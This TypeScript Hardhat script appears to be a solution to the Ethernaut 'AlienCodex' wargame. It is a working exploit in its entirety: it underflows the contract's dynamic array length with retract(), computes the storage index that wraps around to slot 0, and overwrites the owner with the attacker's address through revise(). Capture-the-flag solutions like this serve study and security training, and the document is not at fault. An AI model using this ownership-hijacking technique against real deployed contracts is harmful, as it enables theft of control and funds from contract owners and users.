import { BigNumber } from "ethers";
import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x0cbf1c5d3327D28e82E0aFAaF38Fe23b075B0adD";
const CONTRACT_NAME = "AlienCodex";

async function main() {
  const [attacker] = await ethers.getSigners();

  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  let tx
  tx = await contract.make_contact();
  await tx.wait();

  tx = await contract.retract();
  await tx.wait();

  const mapLengthAddress = "0x0000000000000000000000000000000000000000000000000000000000000001";
  const mapStartSlot = BigNumber.from(ethers.utils.keccak256(mapLengthAddress));

  const NUMBER_OF_SLOTS = BigNumber.from("2").pow("256");
  const ownerPositionInMap = NUMBER_OF_SLOTS.sub(mapStartSlot);

  const parsedAddress = ethers.utils.hexZeroPad(attacker.address, 32)

  tx = await contract.revise(ownerPositionInMap, parsedAddress)
  await tx.wait()
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
